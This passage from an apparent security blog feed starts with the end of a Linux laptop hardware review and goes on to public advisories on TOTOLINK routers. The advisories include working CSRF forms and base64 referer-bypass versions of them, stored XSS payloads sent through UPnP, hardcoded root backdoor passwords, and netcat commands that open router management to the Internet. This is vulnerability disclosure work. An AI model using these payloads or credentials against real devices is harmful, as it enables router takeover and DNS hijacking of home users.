type             16 bytes     64 bytes    256 bytes   1024 bytes   8192 bytes
aes-128-cbc     408583.33k   438564.63k   446640.47k   448723.97k   449306.62k
</code></pre>
<p>AES-256-CBC without AESNI</p>
<pre><code>The 'numbers' are in 1000s of bytes per second processed.
type             16 bytes     64 bytes    256 bytes   1024 bytes   8192 bytes
aes-256 cbc      58418.36k    62665.13k    63112.87k    63973.72k    64217.09k
</code></pre>
<p>AES-256-CBC with AESNI</p>
<pre><code>The 'numbers' are in 1000s of bytes per second processed.
type             16 bytes     64 bytes    256 bytes   1024 bytes   8192 bytes
aes-256-cbc     300206.54k   316254.66k   320890.28k   322990.83k   322144.94k
</code></pre>
<p>AES-128-XTS with AESNI</p>
<pre><code>The 'numbers' are in 1000s of bytes per second processed.
type             16 bytes     64 bytes    256 bytes   1024 bytes   8192 bytes
aes-128-xts     297439.41k   902695.81k  1595138.22k  2103062.19k  2308871.51k
</code></pre>
<p>AES-256-XTS with AESNI</p>
<pre><code>The 'numbers' are in 1000s of bytes per second processed.
type             16 bytes     64 bytes    256 bytes   1024 bytes   8192 bytes
aes-256-xts     225793.73k   652700.97k  1182342.40k  1568823.64k  1723970.90k
</code></pre>
<p>I recommend AES-256-XTS with AESNI for the awesome performances (1,5GB/s for 1024bytes and 1.7GB/s for 8K)</p>
<h2>Physical Ports:</h2>
<ul>
<li>1 HDMI - works</li>
<li>2 USB3 - work</li>
<li>1 mini-usb (for the 10/100 RJ45 adapter) - work (see below)</li>
<li>1 port power supply</li>
<li>1 jack port - works</li>
<li>1 micro-sd port - works (mmc0)</li>
</ul>
<h2>TouchPad:</h2>
<p>It works perfectly.</p>
<p>Use these settings for better usability:</p>
<pre><code>$ synclient VertEdgeScroll=1
$ synclient TapButton1=1
$ synclient VertTwoFingerScroll=1
</code></pre>
<h2>FN-Keys:</h2>
<ul>
<li>Brightness+ works by default</li>
<li>Brightness- works by default</li>
<li>Sound+ works by default</li>
<li>Sound- works by default</li>
<li>Sound-Remove works by default</li>
<li>Contrast-Change works by default</li>
<li>Suspend works by default</li>
</ul>
<h2>Network:</h2>
<p>Wifi: you have to install firmware-iwlwifi to enable the wifi.</p>
<pre><code># apt-get install firmware-iwlwifi


$ /sbin/ifconfig wlan0
wlan0     Link encap:Ethernet  HWaddr cc:3d:01:23:45:67
UP BROADCAST MULTICAST  MTU:1500  Metric:1
RX packets:0 errors:0 dropped:0 overruns:0 frame:0
TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:1000
RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
</code></pre>
<p>10/100 RJ45 using the LG external connector:</p>
<pre><code>usb 1-5: new high-speed USB device number 5 using xhci_hcd
usb 1-5: New USB device found, idVendor=0bda, idProduct=8152
usb 1-5: New USB device strings: Mfr=1, Product=2, SerialNumber=3
usb 1-5: Product: USB 10/100 LAN
usb 1-5: Manufacturer: Realtek
usb 1-5: SerialNumber: 00E040123456
usbcore: registered new interface driver r8152
usbcore: registered new interface driver cdc_ether
usb 1-5: reset high-speed USB device number 5 using xhci_hcd
xhci_hcd 0000:00:14.0: xHCI xhci_drop_endpoint called with disabled ep ffff8802447d4600
xhci_hcd 0000:00:14.0: xHCI xhci_drop_endpoint called with disabled ep ffff8802447d4648
xhci_hcd 0000:00:14.0: xHCI xhci_drop_endpoint called with disabled ep ffff8802447d4690
r8152 1-5:1.0 eth0: v1.06.0 (2014/03/03)
IPv6: ADDRCONF(NETDEV_UP): eth0: link is not ready

$ /sbin/ifconfig eth0
eth0      Link encap:Ethernet  HWaddr 00:e0:40:12:34:56
UP BROADCAST MULTICAST  MTU:1500  Metric:1
RX packets:0 errors:0 dropped:0 overruns:0 frame:0
TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:1000
RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
</code></pre>
<h2>Webcam:</h2>
<p>webcam works by default (as /dev/video0 with V4L)</p>
<pre><code>usb 1-7: new high-speed USB device number 6 using xhci_hcd
usb 1-7: New USB device found, idVendor=2232, idProduct=5005
usb 1-7: New USB device strings: Mfr=3, Product=1, SerialNumber=2
usb 1-7: Product: LG HD WebCam
usb 1-7: Manufacturer: Generic
usb 1-7: SerialNumber: 200900000000
uvcvideo: Found UVC 1.00 device LG HD WebCam (2232:5005)
input: LG HD WebCam as /devices/pci0000:00/0000:00:14.0/usb1/1-7/1-7:1.0/input/input27
</code></pre>
<h2>lspci:</h2>
<pre><code>00:00.0 Host bridge: Intel Corporation Broadwell-U Host Bridge -OPI (rev 09)
00:02.0 VGA compatible controller: Intel Corporation Broadwell-U Integrated Graphics (rev 09)
00:03.0 Audio device: Intel Corporation Broadwell-U Audio Controller (rev 09)
00:04.0 Signal processing controller: Intel Corporation Broadwell-U Camarillo Device (rev 09)
00:14.0 USB controller: Intel Corporation Wildcat Point-LP USB xHCI Controller (rev 03)
00:16.0 Communication controller: Intel Corporation Wildcat Point-LP MEI Controller #1 (rev 03)
00:1b.0 Audio device: Intel Corporation Wildcat Point-LP High Definition Audio Controller (rev 03)
00:1c.0 PCI bridge: Intel Corporation Wildcat Point-LP PCI Express Root Port #1 (rev e3)
00:1d.0 USB controller: Intel Corporation Wildcat Point-LP USB EHCI Controller (rev 03)
00:1f.0 ISA bridge: Intel Corporation Wildcat Point-LP LPC Controller (rev 03)
00:1f.2 SATA controller: Intel Corporation Wildcat Point-LP SATA Controller [AHCI Mode] (rev 03)
00:1f.3 SMBus: Intel Corporation Wildcat Point-LP SMBus Controller (rev 03)
01:00.0 Network controller: Intel Corporation Wireless 7260 (rev bb)
</code></pre>
<h2>Misc:</h2>
<ul>
<li>Suspend-to-RAM works</li>
<li>Sound works</li>
</ul>
<h2>Untested:</h2>
<ul>
<li>bluetooth</li>
</ul>
<h1>Final Conclusion:</h1>
<p>Everything works. The laptop is very light and has great performances.
Note that this laptop can be ordered without Windows, and <a href="https://pierrekim.github.io/blog/2015-06-09-recovering-windows-on-a-windows-free-lg-laptop.html">Windows can be recovered in the "Windows-Free" SSD</a>.</p></content>
    </entry>
    
    <entry>
        <title>4 TOTOLINK router models vulnerable to CSRF and XSS attacks</title>
        <link href="2015-07-16-4-TOTOLINK-products-vulnerable-to-CSRF-and-XSS-attacks.html"/>
        <content type="html"><pre><code>-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

## Advisory Information

Title: 4 TOTOLINK router models vulnerable to CSRF and XSS attacks
Advisory URL: https://pierrekim.github.io/advisories/2015-totolink-0x01.txt
Blog URL: http://pierrekim.github.io/blog/2015-07-16-4-TOTOLINK-products-vulnerable-to-CSRF-and-XSS-attacks.html
Date published: 2015-07-16
Vendors contacted: None
Release mode: Released, 0day
CVE: no current CVE



## Product Description

TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO markets in South Korea.
TOTOLINK produces routers, wifi access points and network devices. Their products are sold worldwide.



## Vulnerability Summary

TOTOLINK iPuppy, iPuppy3, N100RE and N200RE are wireless LAN routers. Their current firmwares with default configuration are
vulnerable to CSRF-attacks and XSS attacks.
Since, the anti-CSRF protection is based on a static HTTP referrer (RFC 1945), an attacker can take over
most of the configuration and settings using anyone inside the LAN of the router. Owners are urged to
contact TOTOLINK, and activate authentication on this product (disabled by default).

It affects (firmwares come from totolink.net and from totolink.cn):

- TOTOLINK iPuppy : firmware 1.2.1 (TOTOLINK iPuppy__V1.2.1.update)
- TOTOLINK iPuppy3 : firmware 1.0.2 (TOTOLINK iPuppy3_V1.0.2.update)
- TOTOLINK N100RE-V1 : firmware V1.1-B20140723-2-432-EN (TOTOLINK-N100RE-IP04216-RT5350-SPI-1M8M-V1.1-B20140723-2-432-EN.update)
- TOTOLINK N200RE : firmware V1.4-B20140724-2-457-EN (TOTOLINK-N200RE-IP04220-MT7620-SPI-1M8M-V1.4-B20140724-2-457-EN.update)



## Details - CSRF

The HTTP interface allows to edit the configuration. This interface is vulnerable to CSRF.

Configuration and settings can be modified with CSRF attacks:
- Activate the remote control management
- Change the DNS configuration
- Update the firmware
- Change the Wifi Configuration
- Create TCP redirections to the LAN
- and more...


Example of forms exploiting the CSRF:


o Activating the remote control management on port 31337/tcp listening on the WAN interface.

&lt;html&gt;
&lt;head&gt;
&lt;script&gt;
function s() {
document.f.submit();
}
&lt;/script&gt;
&lt;/head&gt;
&lt;body onload="s()"&gt;
&lt;form id="f" name="f" method="POST" action="http://192.168.1.1/do_cmd.htm"&gt;
&lt;input type="hidden" name="CMD" value="SYS"&gt;
&lt;input type="hidden" name="GO" value="firewallconf_accesslist.html"&gt;
&lt;input type="hidden" name="nowait" value="1"&gt;
&lt;input type="hidden" name="SET0" value="17367296=31337"&gt;
&lt;input type="hidden" name="SET1" value="17236224=1"&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;


o Changing the DNS configuration to 0.2.0.7 and 1.2.0.1:

&lt;html&gt;
&lt;head&gt;
&lt;script&gt;
function s() {
document.f.submit();
}
&lt;/script&gt;
&lt;/head&gt;
&lt;body onload="s()"&gt;
&lt;form id="f" name="f" method="POST" action="http://192.168.1.1/do_cmd.htm"&gt;
&lt;input type="hidden" name="CMD" value="WAN"&gt;
&lt;input type="hidden" name="GO" value="netconf_wansetup.html"&gt;
&lt;input type="hidden" name="SET0" value="50397440=2"&gt;
&lt;input type="hidden" name="SET1" value="50856960=64-E5-99-AA-AA-AA"&gt;
&lt;input type="hidden" name="SET2" value="235077888=1"&gt;
&lt;input type="hidden" name="SET3" value="235012865=0.2.0.7"&gt;
&lt;input type="hidden" name="SET4" value="235012866=1.2.0.1"&gt;
&lt;input type="hidden" name="SET5" value="51118336=0"&gt;
&lt;input type="hidden" name="SET6" value="51839232=1"&gt;
&lt;input type="hidden" name="SET7" value="51511552=1500"&gt;
&lt;input type="hidden" name="SET8" value="117834240="&gt;
&lt;input type="hidden" name="SET9" value="117703168="&gt;
&lt;input type="hidden" name="SET10" value="117637376=1492"&gt;
&lt;input type="hidden" name="SET11" value="51446016=1500"&gt;
&lt;input type="hidden" name="SET12" value="50463488=192.168.1.1"&gt;
&lt;input type="hidden" name="SET13" value="50529024=255.255.255.0"&gt;
&lt;input type="hidden" name="SET14" value="50594560=192.168.1.254"&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;


The variable GO is an open redirect. Any URL like http://www.google.com/ for instance can be used.
The variable GO is also vulnerable to XSS. It's out of scope in this advisory.


To bypass the protection (which checks the refer), you can, for example, base64 the form and include
it in the webpage.
The refer will be empty and the CSRF will be accepted by the device:



o activate_admin_wan_csrf_bypass.html:

&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv="Refresh" content="1;url=data:text/html;charset=utf8;base64,PGh0bWw+CjxoZWFkPgo8c2NyaXB0PgpmdW5jdGlvbiBzKCkgewogIGRvY3VtZW50LmYuc3VibWl0KCk7Cn0KPC9zY3JpcHQ+CjwvaGVhZD4KPGJvZHkgb25sb2FkPSJzKCkiPgo8Zm9ybSBpZD0iZiIgbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249Imh0dHA6Ly8xOTIuMTY4LjEuMS9kb19jbWQuaHRtIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iQ01EIiB2YWx1ZT0iU1lTIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iR08iIHZhbHVlPSJmaXJld2FsbGNvbmZfYWNjZXNzbGlzdC5odG1sIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ibm93YWl0IiB2YWx1ZT0iMSI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDAiIHZhbHVlPSIxNzM2NzI5Nj0zMTMzNyI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDEiIHZhbHVlPSIxNzIzNjIyND0xIj4KPC9mb3JtPgo8L2JvZHk+CjwvaHRtbD4K"&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;


Visiting activate_admin_wan_csrf_bypass.html in a remote location will activate
the remote management interface on port 31337/TCP.

You can test it through http://pierrekim.github.io/advisories/2015-totolink-0x01-PoC-change_dns_csrf_bypass.html



o change_dns_csrf_bypass.html:

&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv="Refresh" content="1;url=data:text/html;charset=utf8;base64,PGh0bWw+CjxoZWFkPgo8c2NyaXB0PgpmdW5jdGlvbiBzKCkgewogIGRvY3VtZW50LmYuc3VibWl0KCk7Cn0KPC9zY3JpcHQ+CjwvaGVhZD4KPGJvZHkgb25sb2FkPSJzKCkiPgo8Zm9ybSBpZD0iZiIgbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249Imh0dHA6Ly8xOTIuMTY4LjEuMS9kb19jbWQuaHRtIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iQ01EIiB2YWx1ZT0iV0FOIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iR08iIHZhbHVlPSJuZXRjb25mX3dhbnNldHVwLmh0bWwiPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJTRVQwIiB2YWx1ZT0iNTAzOTc0NDA9MiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDEiIHZhbHVlPSI1MDg1Njk2MD02NC1FNS05OS1BQS1BQS1BQSI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDIiIHZhbHVlPSIyMzUwNzc4ODg9MSI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDMiIHZhbHVlPSIyMzUwMTI4NjU9MC4yLjAuNyI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDQiIHZhbHVlPSIyMzUwMTI4NjY9MS4yLjAuMSI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDUiIHZhbHVlPSI1MTExODMzNj0wIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iU0VUNiIgdmFsdWU9IjUxODM5MjMyPTEiPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJTRVQ3IiB2YWx1ZT0iNTE1MTE1NTI9MTUwMCI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDgiIHZhbHVlPSIxMTc4MzQyNDA9Ij4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iU0VUOSIgdmFsdWU9IjExNzcwMzE2OD0iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJTRVQxMCIgdmFsdWU9IjExNzYzNzM3Nj0xNDkyIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iU0VUMTEiIHZhbHVlPSI1MTQ0NjAxNj0xNTAwIj4KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iU0VUMTIiIHZhbHVlPSI1MDQ2MzQ4OD0xOTIuMTY4LjEuMSI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDEzIiB2YWx1ZT0iNTA1MjkwMjQ9MjU1LjI1NS4yNTUuMCI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IlNFVDE0IiB2YWx1ZT0iNTA1OTQ1NjA9MTkyLjE2OC4xLjI1NCI+CjwvZm9ybT4KPC9ib2R5Pgo8L2h0bWw+Cg=="&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;


Visiting activate_admin_wan_csrf_bypass.html in a remote location will change the DNS servers
provided by the TOTOLINK device in the LAN.

You can test it through http://pierrekim.github.io/advisories/2015-totolink-0x01-PoC-activate_admin_wan_csrf_bypass.html



## Details - stored XSS and fun

There is a stored XSS, which can be injected using UPNP from the LAN, without authentication:

upnp&gt; host send 0 WANConnectionDevice WANIPConnection AddPortMapping

Required argument:
Argument Name:  NewPortMappingDescription
Data Type:      string
Allowed Values: []
Set NewPortMappingDescription value to: &lt;script&gt;alert("XSS");&lt;/script&gt;

Required argument:
Argument Name:  NewLeaseDuration
Data Type:      ui4
Allowed Values: []
Set NewLeaseDuration value to: 0

Required argument:
Argument Name:  NewInternalClient
Data Type:      string
Allowed Values: []
Set NewInternalClient value to: &lt;script&gt;alert("XSS");&lt;/script&gt;

Required argument:
Argument Name:  NewEnabled
Data Type:      boolean
Allowed Values: []
Set NewEnabled value to: 1

Required argument:
Argument Name:  NewExternalPort
Data Type:      ui2
Allowed Values: []
Set NewExternalPort value to: 80

Required argument:
Argument Name:  NewRemoteHost
Data Type:      string
Allowed Values: []
Set NewRemoteHost value to: &lt;script&gt;alert("XSS");&lt;/script&gt;

Required argument:
Argument Name:  NewProtocol
Data Type:      string
Allowed Values: ['TCP', 'UDP']
Set NewProtocol value to: TCP

Required argument:
Argument Name:  NewInternalPort
Data Type:      ui2
Allowed Values: []
Set NewInternalPort value to: 80


upnp&gt;


The UPNP webpage in the administration area (http://192.168.0.1/popup_upnp_portmap.html) will show:

[...]
&lt;tr&gt;
&lt;td class=item_td&gt;TCP&lt;/td&gt;
&lt;td class=item_td&gt;21331&lt;/td&gt;
&lt;td class=item_td&gt;&lt;script&gt;alert("XSS")&lt;script&gt;alert("XSS");&lt;/script&gt;:28777&lt;/td&gt;
&lt;td class=item_td&gt;&lt;script&gt;alert("XSS");&lt;/script&gt;&lt;/td&gt;
&lt;/tr&gt;
[...]


- - - - From my research, there are some bits overflapping with others, resulting in showing funny ports
and truncating input data. A remote DoS against the upnpd process seems to be easily done.

Gaining Remote Code Execution by UPNP exploitation is again left as a exercise for the reader.



## Vendor Response

Due to "un-ethical code" found in TOTOLINK products (= backdoors found in new TOTOLINK devices), TOTOLINK was not contacted in regard of this case.



## Report Timeline

* Apr 20, 2015: Vulnerabilities found by Pierre Kim in ipTIME devices.
* Jun 20, 2015: Vulnerabilities confirmed with reliable PoCs.
* Jun 25, 2015: Vulnerabilities found in TOTOLINK products by looking for similar ipTIME products.
* Jul 16, 2015: A public advisory is sent to security mailing lists.



## Credit

These vulnerabilities were found by Pierre Kim (@PierreKimSec).



## Greetings

Big thanks to Alexandre Torres.



## References

https://pierrekim.github.io/advisories/2015-totolink-0x01.txt



## Disclaimer

This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/


-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCgAGBQJVq/PbAAoJEMQ+Dtp9ky28JPQQAIaJJ3qgA0YZQ7AG39aUav3t
z53mLvi5Cej3FfLVFxWeejbdkLWRLQCr+jwLH/oNyc4V4N/aDE7X8LNWDsN5LRQv
wN21zY83sGkcG8FB3cSSubMjWZ2ZjeH7MSwSryXjfIO/RAFfRFFPV/1abdkqQWIn
WvLHkDMI/8fHJc5mNJeAqqtsK9+t0kz6OdABmvAA5dNGd1ZddEaG/HW8xnebcAlh
ByuLynQ5rgUGr+eTmB+DZinMk1e/P6ZiEs0urmIshUYeX3gx808Q68tF7jKcJNtr
lC5NVJ6h8cQ3pjMOMs/5RQLcC6aCRidX3AoaO/kyibMTz+F6VwJD2WQwxb78M0B3
FjjrHb+v1MdLhantwhZ1mfznm7rJ1/5TCq0hVjQ6sXc5/KbkZRQWq8IC65I6kFRm
aRp2U17C5OLJ4KQ2vYb/0yy4KaIL1C7gCB2oWZ8CyyG53wn79CxcPQ5uO2Jnf6XM
UP597Bq1JDlDsTGpMjf0kBZ8v2vcjc3gN8EZg7T2w4aNuxMjm+Y8gbu51s8yDSdC
G0xg6mqZa2ZIt2FbWmMgo/+t04aBaUGB4y5tIeILWH2FFrHlpyvtuU5IMys/DiO+
7Nr8g4RTEskP8x2/TAh05YJYcY8Bai5RTAQaTwT3cUNdp3B8UiLxtVwfTzmI4//F
bjG1WlLuMMpz1dwPfEB6
=c3Q7
-----END PGP SIGNATURE-----
</code></pre></content>
    </entry>
    
    <entry>
        <title>Backdoor credentials found in 4 TOTOLINK router models</title>
        <link href="2015-07-16-backdoor-credentials-found-in-4-TOTOLINK-products.html"/>
        <content type="html"><pre><code>-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

## Advisory Information

Title: Backdoor credentials found in 4 TOTOLINK router models
Advisory URL: https://pierrekim.github.io/advisories/2015-totolink-0x03.txt
Blog URL: https://pierrekim.github.io/blog/2015-07-16-backdoor-credentials-found-in-4-TOTOLINK-products.html
Date published: 2015-07-16
Vendors contacted: None
Release mode: 0days, Released
CVE: no current CVE



## Product Description

TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO markets in South Korea.
TOTOLINK produces routers, wifi access points and network devices. Their products are sold worldwide.



## Vulnerabilities Summary

Backdoor credentials are present in several TOTOLINK products.

It affects 4 TOTOLINK products (firmwares come from totolink.net and from totolink.cn):

- G150R-V1 : last firmware 1.0.0-B20150330 (TOTOLINK-G150R-V1.0.0-B20150330.1734.web)
- G300R-V1 : last firmware 1.0.0-B20150330 (TOTOLINK-G300R-V1.0.0-B20150330.1816.web)
- N150RH-V1 : last firmware 1.0.0-B20131219 (TOTOLINK-N150RH-V1.0.0-B20131219.1014.web)
- N301RT-V1 : last firmware 1.0.0 (TOTOLINK N301RT_V1.0.0.web)

It allows an attacker in the LAN to connect to the device using telnet with 2 different accounts: root and 'onlime_r' which gives with root privileges.



## Details - G150R-V1 and G300R-V1

The init.d script executes these commands when the router starts:

[...]
cp /etc/passwd_orig /var/passwd
cp /etc/group_orig /var/group
telnetd&amp;
[...]


The /etc/passwd_orig contains backdoor credentials:

root:$1$01OyWDBw$Hrxb2t.LtmiiJD49OBsCU/:0:0:root:/:/bin/sh
onlime_r:$1$01OyWDBw$Hrxb2t.LtmiiJD49OBsCU/:0:0:root:/:/bin/sh
nobody:x:0:0:nobody:/:/dev/null

The corresponding passwords are:

root:12345
onlime_r:12345


## Details - N150RH-V1 and N301RT

The init.d script executes these commands when the router starts:

[...]
#start telnetd
telnetd&amp;
[...]

The binary /bin/sysconf executes these commands when the router starts:

system("cp /etc/passwd.org /var/passwd 2&gt; /dev/null")


The /etc/passwd.org contains backdoor credentials:

root:$1$01OyWDBw$Hrxb2t.LtmiiJD49OBsCU/:0:0:root:/:/bin/sh
onlime_r:$1$01OyWDBw$Hrxb2t.LtmiiJD49OBsCU/:0:0:root:/:/bin/sh
nobody:x:0:0:nobody:/:/dev/null

The corresponding passwords are:

root:12345
onlime_r:12345



## Vendor Response

TOTOLINK was not contacted in regard of this case.



## Report Timeline

* Jun 25, 2015: Backdoor found by analysing TOTOLINK firmwares.
* Jun 26, 2015: working PoCs.
* Jul 16, 2015: A public advisory is sent to security mailing lists.



## Credit

These backdoor credentials were found Pierre Kim (@PierreKimSec).



## References

https://pierrekim.github.io/advisories/2015-totolink-0x03.txt



## Disclaimer

This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/


-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCgAGBQJVq/MNAAoJEMQ+Dtp9ky28FroP/jM/FCTlC93R5bdmPzn7l0kR
247lhuqqMO689jGkz3kiTqUIEidKoAluH6xqs2xhqVMYie9CfrWsRwrbuF+5RSkZ
jmzvGVH2teGBuJ70+hVY81FvEsleG5eCdz4nZXKPcyLMfSw0HxxBp4ooCDQsSj2f
WAgKfQmKY123TLAwE+R51z2ZXPlxMIyRyjy33utQk5wtDCK0gqOtsFqA7CLtJgth
EBi2YjrxNDM8FYJx4f7A8RBAOp34rHQx/xn2yvylwUkwZ8P0LcC9EmMPZUo0q3xu
dIfPV1HJWlYyPVxqXg9ATWvODBbAyOWpf0/CwBsRmZVRbJL7/9tCzDYRwrm9PFgJ
Od47n+82UfvD1aiAQxdm983Rf5i2t2ssW/e2fr9jOiWqIQChc/eRmUpso8Okluzo
ZUVxhJGBigAsd+Z0FRCeBUki8LUKCAtbfe7Vkn/v5AlOamyc/VNOQNZpbbqa1SUv
64DaPOhzXQ6WBGkzwxWOHy+qfQT+7/dfGZ7i6n7TwV4tIJm6yLioPBp7F1WceWh6
KySutfVi0wpIf8mcbigsdaHmPqGSNxKnbitr8GETdV+WME5REvn9d8DhSJ7Cy+Eh
PNPDAdSZES8WPl0f5QCNgNUxrCsFM7DLW6P15HFI/NqFzLAdifqT6IKeQtXTdYwH
g9PPILKUXFZssc0SceTB
=pLPu
-----END PGP SIGNATURE-----
</code></pre></content>
    </entry>
    
    <entry>
        <title>Backdoor and RCE found in 8 TOTOLINK router models</title>
        <link href="2015-07-16-backdoor-and-RCE-found-in-8-TOTOLINK-products.html"/>
        <content type="html"><h2>Product Description</h2>
<p>TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO markets in South Korea.
TOTOLINK produces routers, wifi access points and network devices. Their products are sold worldwide.</p>
<h2>Vulnerabilities Summary</h2>
<p>A backdoor is present in several TOTOLINK products.
This was confirmed by analyzing the latest firmwares and by testing the backdoor against live routers.</p>
<p>At least 8 TOTOLINK products are affected (firmwares come from totolink.net and from totolink.cn):</p>
<ul>
<li>A850R-V1 : until last firwmware TOTOLINK-A850R-V1.0.1-B20150707.1612.web</li>
<li>F1-V2 : until last firmware F1-V2.1.1-B20150708.1646.web</li>
<li>F2-V1 : until last firmware F2-V2.1.0-B20150320.1611.web</li>
<li>N150RT-V2 : until last firmware TOTOLINK-N150RT-V2.1.1-B20150708.1548.web</li>
<li>N151RT-V2 : until last firmware TOTOLINK-N151RT-V2.1.1-B20150708.1559.web</li>
<li>N300RH-V2 : until last firmware TOTOLINK-N300RH-V2.0.1-B20150708.1625.web</li>
<li>N300RH-V3 : until last firmware TOTOLINK-N300RH-V3.0.0-B20150331.0858.web</li>
<li>N300RT-V2 : until last firmware TOTOLINK-N300RT-V2.1.1-B20150708.1613.web</li>
</ul>
<p>By sending a crafted request to the WAN IP, an attacker will open the HTTP remote management interface on the Internet.
Then an attacker can use a Remote Code Execution in the HTTP remote management interface by using the hidden /boafrm/formSysCmd form, bypassing the authentication system.</p>
<p>We estimate there are =~ 50 000 routers affected by this backdoor.</p>
<h2>Details - backdoor - CVE-2015-9550</h2>
<p>The /etc/init.d/rcS script executes the /bin/skt binary when the router starts:</p>
<pre><code>cat etc/init.d/rcS
[...]
# start web server
boa
skt&amp;
</code></pre>
<p>skt is a small MIPS binary which is a client/server program. The arguments are:</p>
<pre><code>server: ./skt
client: ./skt host cmd
</code></pre>
<p>The binary can be used in x86_64 machines using QEMU: sudo chroot . ./qemu-mips-static ./bin/skt</p>
<p>Using skt without argument will launch a TCP daemon on port 5555 in every interface (including WAN), acting as an ECHO server.
Using skt with arguments will send a TCP packet containing the command to the specified IP on port 5555.</p>
<p>There are 2 main functions in <code>skt</code>:</p>
<ul>
<li>TcpClient is a simple TCP client.</li>
<li>TcpServer looks like an echo server.</li>
</ul>
<p><strong>TcpClient:</strong></p>
<p>It will send a TCP packet containing hel,xasf, oki,xasf or bye,xasf, depending the arguments used (1,2,3), to a remote IP on port 5555.</p>
<p><strong>TcpServer:</strong></p>
<p>TcpServer is an echo server listening on port 5555/tcp and  it compares strings provided by the user with hardcoded
strings ("hel,xasf", "oki,xasf").</p>
<p>The problem is in the sub_400B50 function:</p>
<p><img alt="" src="images/2015-totolink-0x02-backdoor-00.png" /></p>
<p><strong>Pseudo-code of sub_400B50:</strong></p>
<pre><code>int32_t sub_400B50(int32_t a1, char *str, int32_t a3, int32_t a4, int32_t a5) {
    if (strcmp(str, "hel,xasf") == 0) {
        system("iptables -I INPUT -p tcp --dport 80 -i eth1 -j ACCEPT");
    } else {
        if (strcmp(str, "oki,xasf") == 0) {
            system("iptables -D INPUT -p tcp --dport 80 -i eth1 -j ACCEPT");
        }
    }
    [...]
}
</code></pre>
<p>This function compares str, which is an user-given string, with 2 hardcoded strings to execute system().</p>
<p>The analysis of the binary running on the TOTOLINK devices shows the server mode responds to 3 commands by silently executing
system() in the background:</p>
<ul>
<li>
<p>By sending "hel,xasf" to the device, the device will execute:</p>
<p>iptables -I INPUT -p tcp --dport 80 -i eth1 -j ACCEPT</p>
<p>This will open the HTTP remote management interface on port 80 in the eth1 interface which is the WAN interface by default.</p>
</li>
<li>
<p>By sending "oki,xasf" to the device, the device will execute:</p>
<p>iptables -D INPUT -p tcp --dport 80 -i eth1 -j ACCEPT </p>
<p>This will close the HTTP remote management interface.</p>
</li>
<li>
<p>By sending "bye,xasf" (hardcoded string in the binary) to the device, the device will do nothing</p>
</li>
</ul>
<p>The iptables commands in the backdoor are hardcoded with "eth1".
Only devices using DHCP and static IP connections are affected because the WAN IP is attached on the eth1 device.</p>
<p>It does not affect devices using PPPoE connections, because the WAN IP is attached on the ppp device, as seen below:</p>
<pre><code>totolink# ifconfig
ppp0      Link encap:Point-to-Point Protocol  
          inet addr:X.X.X.X  P-t-P:X.X.X.X  Mask:255.255.255.255
          UP POINTOPOINT RUNNING NOARP MULTICAST  MTU:1438  Metric:1
          RX packets:17308398 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2605290 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:64 
          RX bytes:2803138455 (2.6 GiB)  TX bytes:277402492 (264.5 MiB)
</code></pre>
<p>An attacker can use these simple netcat commands to test the backdoor:</p>
<p>To open the HTTP remote management interface on the Internet:</p>
<pre><code>echo -ne "hel,xasf" | nc &lt;ip&gt; 5555
</code></pre>
<p>To close the HTTP remote management interface on the Internet:</p>
<pre><code>echo -ne "oki,xasf" | nc &lt;ip&gt; 5555
</code></pre>
<p>To detect a vulnerable router:</p>
